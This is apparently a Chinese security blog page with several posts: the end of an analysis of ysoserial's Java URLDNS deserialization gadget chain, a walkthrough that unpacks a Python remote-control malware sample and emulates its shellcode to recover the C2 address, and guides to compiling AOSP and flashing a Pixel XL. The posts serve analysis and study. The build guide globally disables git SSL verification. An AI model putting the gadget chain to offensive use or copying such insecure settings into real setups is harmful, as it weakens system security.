<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (hostAddress != <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> hostAddress;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (host == <span class="literal">null</span> || host.isEmpty()) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">      hostAddress = InetAddress.getByName(host);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (UnknownHostException | SecurityException ex) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> hostAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我debug了一下，其实这个host就是我们在使用ysoserial时对应的dnslog的地址。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E6%8E%A2%E6%B5%8B/640-20221009215113785.png" alt="图片"></p>
<p>接着上边的代码将host传给了<code>InetAddress.getByName()</code>，这个函数呢其实就是Java里用来做dns解析的一个函数。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E6%8E%A2%E6%B5%8B/640-20221009215117894.png" alt="图片"></p>
<p>那么到这里，就应该基本清楚了，也就是最开始是HashMap#put了一个元素为URL，然后这个URL实例最终调用了自身的getHostAddress函数，进行了dns解析，所以在dnslog平台上有相应的解析记录。</p>
<ul>
<li><p>所以整个调用链过程如下</p>
</li>
<li><ul>
<li>HashMap -&gt; readObject()</li>
<li>HashMap -&gt; hash()</li>
<li>URL -&gt; hashCode()</li>
<li>URLStreamHandler -&gt; hashCode()</li>
<li>URLStreamHandler -&gt; getHostAddress()</li>
<li>InetAddress-&gt;getByName()</li>
</ul>
</li>
</ul>
<h1 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h1><p>在前边URL这个类的hashCode函数里实际上是有一个判断的，也就是hashCode不等于-1的话就会直接返回，那么就无法进入到后续的handler的hashCode了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">// hashCode 不等于 -1 就直接返回hashCode</span></span><br><span class="line">  <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 否则就调用handler的hashCode函数</span></span><br><span class="line">  <span class="comment">// 这里的this其实就是上一段代码中的key，也就是URL这个类的实例本身。</span></span><br><span class="line">  hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">  <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们查看ysoserial的代码可以看到，ysoserial通过反射将hashCode设置为了-1。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E6%8E%A2%E6%B5%8B/640-20221009214841245.png" alt="图片"></p>

      
	</div>

<div class="meta">
	
</div>
</article>

  <article class="post">
	<h2 class="title">
		<a href="2022/08/21/样本分析-Python远控样本/">样本分析-Python远控样本</a>
	</h2>
    <div class="entry-content">
    <div class="meta">
      <div class="date">发布时间: <time datetime="2022-08-21T14:04:21.000Z" itemprop="datePublished">2022-04-21</time>
</div>
      <div class="tags">标签: 

<a href="/tags/样本分析/">样本分析</a>
</div>
    </div>
      
        <p>Python远控样本分析案例，主要任务是提取C2地址，因为样本存在检测沙箱和虚拟机，在没有真机的情况下需进行手动分析获取对应地址。</p>
<p>获取C2地址直接通过抓取流量也是可以的，本文主要还是分享一下实操的过程和经验。</p>
<p>录屏: <a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1pN4y157F8/">https://www.bilibili.com/video/BV1pN4y157F8/</a> 素材: <a target="_blank" rel="noopener" href="https://github.com/MaskCyberSecurityTeam/TechniqueShare">https://github.com/MaskCyberSecurityTeam/TechniqueShare</a></p>
<h1 id="样本类型判断"><a href="#样本类型判断" class="headerlink" title="样本类型判断"></a>样本类型判断</h1><p>通过查看样本字符串，含有python34.dll相关字符串，python编译为exe的话常用的pyinstaller。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings xxx.exe</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-Python%E8%BF%9C%E6%8E%A7%E6%A0%B7%E6%9C%AC/640-20220821220700531.png" alt="图片"></p>
<h1 id="pyinstxtractor"><a href="#pyinstxtractor" class="headerlink" title="pyinstxtractor"></a>pyinstxtractor</h1><p>通过使用pyinstxtractor可以将python写的exe进行解包</p>
<p>项目地址: <a target="_blank" rel="noopener" href="https://github.com/extremecoders-re/pyinstxtractor">https://github.com/extremecoders-re/pyinstxtractor</a></p>
<p>需要使用对应的python版本进行解包才能解除相应的依赖包。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pyinstxtractor.py xxx.exe</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-Python%E8%BF%9C%E6%8E%A7%E6%A0%B7%E6%9C%AC/640-20220821220716925.png" alt="图片"></p>
<h1 id="pyc反编译"><a href="#pyc反编译" class="headerlink" title="pyc反编译"></a>pyc反编译</h1><p>在线反编译工具: <a target="_blank" rel="noopener" href="https://tool.lu/pyc/">https://tool.lu/pyc/</a></p>
<p>提示反编译报错</p>
<p><img src="/images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-Python%E8%BF%9C%E6%8E%A7%E6%A0%B7%E6%9C%AC/640-20220821220725803.png" alt="图片"></p>
<p>猜测可能是文件头存在问题</p>
<p><img src="/images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-Python%E8%BF%9C%E6%8E%A7%E6%A0%B7%E6%9C%AC/640-20220821220732499.png" alt="图片"></p>
<p>使用其他可以成功反编译的pyc文件头进行填充，然后进行反编译。</p>
<p><img src="/images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-Python%E8%BF%9C%E6%8E%A7%E6%A0%B7%E6%9C%AC/640-20220821220741801.png" alt="图片"></p>
<p>反编译成功</p>
<p><img src="/images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-Python%E8%BF%9C%E6%8E%A7%E6%A0%B7%E6%9C%AC/640-20220821220748872.png" alt="图片"></p>
<h1 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h1><p>反编译后发现存在 buf1、buf2、buf3跟进进行查看</p>
<p><img src="/images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-Python%E8%BF%9C%E6%8E%A7%E6%A0%B7%E6%9C%AC/640-20220821220755885.png" alt="图片"></p>
<p>直接传入的位置 <code>loader.payload_loader(buf1+buf2+buf3)</code></p>
<p><img src="/images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-Python%E8%BF%9C%E6%8E%A7%E6%A0%B7%E6%9C%AC/640-20220821220806051.png" alt="图片"></p>
<p>loader是引入的依赖，pyinstxtractor解包正确的话可以在XXX_extracted文件夹中找到依赖。</p>
<p><img src="/images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-Python%E8%BF%9C%E6%8E%A7%E6%A0%B7%E6%9C%AC/640-20220821220812882.png" alt="图片"></p>
<p>使用正确的Python版本解压</p>
<p><img src="/images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-Python%E8%BF%9C%E6%8E%A7%E6%A0%B7%E6%9C%AC/640-20220821220820173.png" alt="图片"></p>
<p><img src="/images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-Python%E8%BF%9C%E6%8E%A7%E6%A0%B7%E6%9C%AC/640-20220821220825277.png" alt="图片"></p>
<p>复用dectry函数，解出shellcode。</p>
<p><img src="/images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-Python%E8%BF%9C%E6%8E%A7%E6%A0%B7%E6%9C%AC/640-20220821220831487.png" alt="图片"></p>
<p>有了原始的shellcode后，只需要将shellcode加载起来就可以得到对应的C2地址了。</p>
<p>通过使用scdbg获取shellcode加载后的C2回连</p>
<p>下载地址: <a target="_blank" rel="noopener" href="https://github.com/dzzie/VS_LIBEMU/releases">https://github.com/dzzie/VS_LIBEMU/releases</a></p>
<p><img src="/images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-Python%E8%BF%9C%E6%8E%A7%E6%A0%B7%E6%9C%AC/640-20220821220843148.png" alt="图片"></p>
<p>使用shellcode加载器加载</p>
<p>下载地址: <a target="_blank" rel="noopener" href="https://github.com/k8gege/scrun">https://github.com/k8gege/scrun</a></p>
<p><img src="/images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-Python%E8%BF%9C%E6%8E%A7%E6%A0%B7%E6%9C%AC/640-20220821220849635.png" alt="图片"></p>
<p>使用火绒剑查看回连的ip，但是这里的ip并不是一个准确的ip，因为C2的通讯使用了像CDN或云函数之类的方式。</p>
<p><img src="/images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-Python%E8%BF%9C%E6%8E%A7%E6%A0%B7%E6%9C%AC/640-20220821220855583.png" alt="图片"></p>
<p>当然最好的是可以使用wireshark方式抓包</p>

      
	</div>

<div class="meta">
	
</div>
</article>

  <article class="post">
	<h2 class="title">
		<a href="2022/08/21/安卓系统定制-手机刷机/">安卓系统定制-手机刷机</a>
	</h2>
    <div class="entry-content">
    <div class="meta">
      <div class="date">发布时间: <time datetime="2022-08-21T13:53:56.000Z" itemprop="datePublished">2022-53-21</time>
</div>
      <div class="tags">标签: 

<a href="/tags/安卓系统定制/">安卓系统定制</a>
</div>
    </div>
      
        <p>上一篇文章中的步骤是针对 <code>Pixel(sailfish)</code>的手机，本篇文章使用的是 <code>PixelXL(Marlin)</code>，所以要注意下编译的安卓系统手机驱动的部分要选择使用的是 <code>Marlin</code>。</p>
<h1 id="刷机前的准备"><a href="#刷机前的准备" class="headerlink" title="刷机前的准备"></a>刷机前的准备</h1><h2 id="硬件设备"><a href="#硬件设备" class="headerlink" title="硬件设备"></a>硬件设备</h2><ul>
<li>Pixel XL（marlin）手机一部 - <strong>需要进行解锁，这里建议大家在咸鱼或淘宝买一部，价格270左右能买到，买时注意问下有没进行解锁。</strong></li>
<li>能连电脑和手机的数据线一条</li>
</ul>
<h2 id="Android套件"><a href="#Android套件" class="headerlink" title="Android套件"></a>Android套件</h2><p>这里下载一个AndroidStudio，通过这个来安装SDK。安装完成后，打开 <code>Preferences</code>。</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821215818982.png" alt="Image"></p>
<p>勾选对应的SDK，这里承接上文，选择SDK10。进行安装</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821215836401.png" alt="Image"></p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821215836387.png" alt="Image"></p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821215836246.png" alt="Image"></p>
<p>安装完成后，在环境变量中添加如下信息(这里笔者使用的是Mac电脑只能提供Mac的了)，相信聪明的你应该知道咋配置。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> ANDROID_HOME=/Users/xxx/Library/Android/sdk/</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;<span class="variable">$ANDROID_HOME</span>/platform-tools:<span class="variable">$ANDROID_HOME</span>/tools:<span class="variable">$PATH</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>SDK的路径在上边的AndroidStudio配置里能看到</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821215916057.png" alt="Image"></p>
<p>输入 <code>fastboot--help</code>和 <code>adb--help</code>，能正常提示的话就是正常了，提示找不到命令的话就检查一下环境变量的配置。</p>
<h2 id="原厂镜像下载"><a href="#原厂镜像下载" class="headerlink" title="原厂镜像下载"></a>原厂镜像下载</h2><p>Google原厂镜像: <a target="_blank" rel="noopener" href="https://developers.google.com/android/images#marlin">https://developers.google.com/android/images#marlin</a></p>
<p>点击页面上的 <code>Acknowledge</code></p>
<p>选择对应的手机型号和Android版本，点击 <code>Link</code>进行下载。</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821215934436.png" alt="Image"></p>
<h1 id="进行刷机"><a href="#进行刷机" class="headerlink" title="进行刷机"></a>进行刷机</h1><p>将手机用数据线连接到电脑上，按照下边的步骤开启USB调试。</p>
<h2 id="USB调试"><a href="#USB调试" class="headerlink" title="USB调试"></a>USB调试</h2><p>开启开发者模式: 设置 -&gt; 关于手机 -&gt; 版本号(连续多次点击就可以开启开发者模式)</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821220001598.png" alt="Image"></p>
<p>开启手机USB调试: 设置 -&gt; 系统 -&gt; 高级 -&gt; USB调试 -&gt; 在手机上点击弹出来要求进行授权的窗口。</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821220010945.png" alt="Image"></p>
<p>打开终端输入 <code>adb devices</code>，能正常显示出有一台设备即可。</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821220019400.png" alt="Image"></p>
<h2 id="进入bootloader模式"><a href="#进入bootloader模式" class="headerlink" title="进入bootloader模式"></a>进入bootloader模式</h2><p>注意这个过程<strong>不要拔掉数据线</strong>，打开命令行输入下边的命令。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb reboot bootloader</span><br></pre></td></tr></table></figure>

<p>或者将<strong>手机关机后同时按住手机电源键与音量减键</strong>，进入bootloader界面。注意下图中提示的 <code>UNLOCKED</code>，代表手机已经是解锁状态。</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821220112690.png" alt="Image"></p>
<h2 id="刷入系统"><a href="#刷入系统" class="headerlink" title="刷入系统"></a>刷入系统</h2><p>这里先使用Google下载的原厂镜像包进行刷机尝试，将下好的包进行解压，然后在手机连接电脑并处于bootloader模式下运行镜像包中的脚本。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 777 ./flash-all.sh</span><br><span class="line">./flash-all.sh</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821220128971.png" alt="Image"></p>
<p>等待脚本执行完</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821220139396.png" alt="Image"></p>
<p>此时正常刷入后，手机就会进入到初始化配置的界面，正常配置就可以了。</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821220201024.png" alt="Image"></p>
<h1 id="刷入定制的系统"><a href="#刷入定制的系统" class="headerlink" title="刷入定制的系统"></a>刷入定制的系统</h1><p>在上一篇文章中，我们已经介绍了如何进行系统编译，编译完成后在 <code>~/bin/aosp/out/target/product/手机代号/</code>文件夹下提取出以下几个文件。</p>
<ul>
<li>vendor.img</li>
<li>system_other.img</li>
<li>system.img</li>
<li>boot.img</li>
</ul>
<p>并将这些文件，放入原本解压出来的Google镜像包中的 <code>.zip</code>文件中，使用压缩包的方式打开这个 <code>.zip</code>文件，然后将文件拖拽进去。</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821220209549.png" alt="Image"></p>
<p>进行覆盖</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821220217614.png" alt="Image"></p>
<p>之后按照前边的刷入系统的步骤再次打开usb调试，通过命令进入bootloader模式，然后运行flash-all.sh脚本即可。</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821220227606.png" alt="Image"></p>
<p>刷机完成后正常配置进入到桌面</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821220241854.png" alt="Image"></p>
<p>可以看到系统的构建版本就是我们自己指定编译的安卓系统。</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E6%89%8B%E6%9C%BA%E5%88%B7%E6%9C%BA/640-20220821220255008.png" alt="Image"></p>
<p>之后的文章中会介绍如何通过自己定制的系统完成一些日常逆向中所需要的操作。</p>

      
	</div>

<div class="meta">
	
</div>
</article>

  <article class="post">
	<h2 class="title">
		<a href="2022/08/21/安卓系统定制-系统编译/">安卓系统定制-系统编译</a>
	</h2>
    <div class="entry-content">
    <div class="meta">
      <div class="date">发布时间: <time datetime="2022-08-21T13:49:18.000Z" itemprop="datePublished">2022-49-21</time>
</div>
      <div class="tags">标签: 

<a href="/tags/安卓系统定制/">安卓系统定制</a>
</div>
    </div>
      
        <h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><h2 id="Ubuntu系统安装"><a href="#Ubuntu系统安装" class="headerlink" title="Ubuntu系统安装"></a>Ubuntu系统安装</h2><p>下载一个Ubuntu-20.04.2.0-desktop系统，之后用来编译安卓系统用。将内存调到 <code>16g+</code>、磁盘 <code>500g+</code>。**(有单独不用的真机的话建议可以使用真机)**</p>
<ul>
<li><p>安装完成后进行如下几个操作</p>
</li>
<li><ul>
<li>关闭睡眠和锁屏 &#x3D; 点击右上角的设置 -&gt; 隐私 -&gt; 锁屏 -&gt; 取消自动锁屏</li>
<li>设置中文 &#x3D; Setting -&gt; Region &amp; Language -&gt; Manage Installed.. -&gt; 添加或删除 -&gt; 中文简体(Chinese Simplifed) -&gt; LogOut</li>
<li>更新下载源 &#x3D; 点击右上角的设置 -&gt; 关于 -&gt; 软件更新 -&gt; 修改”下载自”处位置</li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装虚拟机和真机拖拽用的工具，真机可以忽略。</span></span><br><span class="line">sudo apt-get autoremove open-vm-tools</span><br><span class="line">sudo apt install open-vm-tools-desktop</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>

<h2 id="AOSP源码下载"><a href="#AOSP源码下载" class="headerlink" title="AOSP源码下载"></a>AOSP源码下载</h2><p>这一步是准备安卓源码包，下边的步骤照着做就可以了，建议先玩转起来不要太过多纠结里边的一些概念。</p>
<h3 id="初始化包"><a href="#初始化包" class="headerlink" title="初始化包"></a>初始化包</h3><p>下载: aosp-20210601.tar 有点大119G</p>
<p><strong>因为Android的源码越来越大，直接使用repo sync失败的概率也越来越高。所以我们可以避开使用repo sync的方式，而采用下载初始化包的方式来实现下载源码。</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> ~/bin/</span><br><span class="line"><span class="built_in">cd</span> ~/bin/ <span class="comment"># 将下载好的tar包放在该目录下，并进行解压。</span></span><br><span class="line">tar xvf aosp-latest.tar</span><br></pre></td></tr></table></figure>

<h3 id="同步源码"><a href="#同步源码" class="headerlink" title="同步源码"></a>同步源码</h3><p>安装和配置git，之后需要用到。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git</span><br><span class="line">git config --global user.email aaa@qq.com</span><br><span class="line">git config --global user.name <span class="string">&quot;aaa&quot;</span></span><br><span class="line">git config --global http.sslverify <span class="literal">false</span></span><br><span class="line">git config --global https.sslverify <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>下载repo，repo是一个python脚本(所以还需要配置Python环境)，因为Android源码包含数百个git库，repo用于简化帮助管理AndroidGit版本库的工具。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PATH=~/bin:\$PATH&quot;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br><span class="line">sudo apt-get install curl</span><br><span class="line">curl https://mirrors.tuna.tsinghua.edu.cn/git/git-repo -o ~/bin/repo</span><br><span class="line"><span class="built_in">chmod</span> a+x ~/bin/repo</span><br><span class="line"><span class="built_in">export</span> REPO_URL=<span class="string">&#x27;https://mirrors.tuna.tsinghua.edu.cn/git/git-repo&#x27;</span></span><br><span class="line"><span class="built_in">cd</span> ~/bin/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 需要用到python38</span></span><br><span class="line">sudo <span class="built_in">unlink</span> /usr/bin/python</span><br><span class="line">sudo <span class="built_in">ln</span> -s /usr/bin/python3.8 /usr/bin/python</span><br><span class="line"></span><br><span class="line"><span class="comment"># android版本可以在https://source.android.com/setup/build-numbers中查看，这里指定使用的源码是Android10的10.0.0_r17版</span></span><br><span class="line"><span class="comment"># 指定要同步的分支</span></span><br><span class="line">repo init -u https://mirrors.tuna.tsinghua.edu.cn/git/AOSP/platform/manifest -b android-10.0.0_r17</span><br><span class="line"><span class="built_in">cd</span> ./aosp/</span><br><span class="line">repo <span class="built_in">sync</span> <span class="comment"># 正常同步完成后即可得到完整的android源码目录</span></span><br></pre></td></tr></table></figure>

<p>如果执行repo sync报如下错误</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">repo reset: error: Entry <span class="string">&#x27;.github/workflows/test-ci.yml&#x27;</span> not uptodate. Cannot merge.</span><br><span class="line">fatal: 不能重置索引文件至版本 <span class="string">&#x27;v2.22^0&#x27;</span>。</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E7%B3%BB%E7%BB%9F%E7%BC%96%E8%AF%91/640-20220821215036702.png" alt="Image"></p>
<p>按照下边这个步骤进行解决</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ~/bin/aosp/.repo/repo</span><br><span class="line">git pull <span class="comment"># 同步仓库代码到最新</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 回到aosp目录，重新同步一下源码。</span></span><br><span class="line"><span class="built_in">cd</span> ../../</span><br><span class="line">repo init -u https://mirrors.tuna.tsinghua.edu.cn/git/AOSP/platform/manifest -b android-10.0.0_r17</span><br><span class="line">repo <span class="built_in">sync</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E7%B3%BB%E7%BB%9F%E7%BC%96%E8%AF%91/640-20220821215048565.png" alt="Image"></p>
<p>这时候能看到aosp目录下就有对应版本的安卓源码</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E7%B3%BB%E7%BB%9F%E7%BC%96%E8%AF%91/640-20220821215057870.png" alt="Image"></p>
<h1 id="系统编译"><a href="#系统编译" class="headerlink" title="系统编译"></a>系统编译</h1><p>完成上边的步骤之后，将可以尝试进行系统编译。在编译前需要安装一些系统的依赖</p>
<h2 id="环境依赖"><a href="#环境依赖" class="headerlink" title="环境依赖"></a>环境依赖</h2><p>Android7以上系统编译需要有Jdk8、以及一些系统上的依赖。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:openjdk-r/ppa</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install openjdk-8-jdk</span><br><span class="line"></span><br><span class="line"><span class="comment"># 其他版本的ubuntu依赖,可以参考: https://source.android.com/setup/build/initializing?hl=zh-cn#next-download-the-source</span></span><br><span class="line">sudo apt-get install git-core gnupg flex bison build-essential zip curl zlib1g-dev gcc-multilib g++-multilib libc6-dev-i386 libncurses5 lib32ncurses5-dev x11proto-core-dev libx11-dev lib32z1-dev libgl1-mesa-dev libxml2-utils xsltproc unzip fontconfig libncurses5</span><br></pre></td></tr></table></figure>

<h2 id="手机驱动"><a href="#手机驱动" class="headerlink" title="手机驱动"></a>手机驱动</h2><p>根据自己的手机设备和Android系统版本，来选择对应的手机驱动。</p>
<p>下载地址: <a target="_blank" rel="noopener" href="https://developers.google.com/android/drivers">https://developers.google.com/android/drivers</a></p>
<p>对应系统具体的构建ID查询: <a target="_blank" rel="noopener" href="https://source.android.com/setup/build-numbers">https://source.android.com/setup/build-numbers</a></p>
<p>这里根据上文，这里选择使用的驱动 <code>PixelbinariesforAndroid10.0.0(QP1A.191005.007.A3)</code>。</p>
<p><img src="/images/%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6-%E7%B3%BB%E7%BB%9F%E7%BC%96%E8%AF%91/640-20220821215115851.png" alt="Image"></p>
<p><strong>下载这2个文件，并将这两个压缩包文件上传放置&#x2F;aosp&#x2F;目录下，并解压执行里边的shell脚本。</strong>需要注意的是Shell脚本会要求你输入 <code>I ACCEPT</code>，这个大概在第8条左右的规则那里。</p>
